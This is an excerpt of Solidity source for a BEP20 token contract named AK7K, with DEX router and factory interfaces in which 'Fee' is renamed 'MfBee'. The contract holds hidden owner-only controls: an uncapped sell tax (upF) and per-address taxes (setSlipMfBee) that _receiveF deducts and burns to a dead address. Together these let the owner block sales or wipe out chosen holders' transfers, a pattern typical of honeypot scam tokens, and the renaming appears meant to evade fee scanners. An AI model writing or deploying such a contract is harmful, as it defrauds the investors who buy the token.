...
interface IUniswapV2Factory {
    ...
    function MfBeeTo() external view returns (address);
    function MfBeeToSetter() external view returns (address);
    ...
    function setMfBeeTo(address) external;
    function setMfBeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingMfBeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingMfBeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingMfBeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingMfBeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingMfBeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract AK7K is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellMfBee = 0;

    uint256 private _defaultBuyMfBee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipMfBee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellMfBee = _value;
    }

    function setSlipMfBee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipMfBee[_address] = _value;
    }

    function getSlipMfBee(address _address) external view onlyownar returns (uint256) {
        return _slipMfBee[_address];
    }


    function setMAccountMfBee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountMfBee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeMfBeeAmount = 0;

        if (rF) {
            uint256 tradeMfBee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeMfBee = _defaultSellMfBee;
                }
                if (from == uniswapV2Pair) {

                    tradeMfBee = _defaultBuyMfBee;
                }
            }
            if (_slipMfBee[from] > 0) {
                tradeMfBee = _slipMfBee[from];
            }

            tradeMfBeeAmount = _Amount.mul(tradeMfBee).div(100);
        }


        if (tradeMfBeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeMfBeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeMfBeeAmount);
            emit Transfer(from, _deadAddress, tradeMfBeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeMfBeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeMfBeeAmount);
        emit Transfer(from, _to, _Amount - tradeMfBeeAmount);
    }
